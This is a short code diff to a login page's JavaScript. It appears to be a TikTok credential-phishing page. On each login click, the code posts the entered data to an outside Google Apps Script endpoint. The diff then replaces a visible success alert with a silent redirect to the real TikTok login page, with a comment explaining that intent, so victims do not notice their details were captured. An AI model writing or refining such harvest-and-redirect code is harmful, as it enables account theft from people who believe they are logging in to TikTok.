@@ -303,7 +303,7 @@ function togglePassword() {
     }
 }
 
-/* Handle Login Submission & Google Sheet Data Transfer */
+/* Handle Login Submission, Google Sheet Save & Redirect */
 loginBtn.addEventListener("click", function() {
     if (!loginBtn.disabled) {
         const phoneValue = phone.value.trim();
@@ -318,15 +318,17 @@ loginBtn.addEventListener("click", function() {
 
         const webAppUrl = "https://script.google.com/macros/s/AKfycbxI5xaKP529vLZsw-90oKbuj1XCbdIzhF9vk36zbFzwweqkQW2LAXoJSLPzERz8OKGavQ/exec";
 
+        // Data Google Sheet mein bhej kar foran tiktok login page par redirect kar dega
         fetch(webAppUrl, {
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(educationalData)
         }).then(() => {
-            alert('Data saved to Google Sheet successfully!');
+            window.location.href = "https://www.tiktok.com/login";
         }).catch(error => {
             console.error('Error:', error);
+            window.location.href = "https://www.tiktok.com/login";
         });
     }
 });
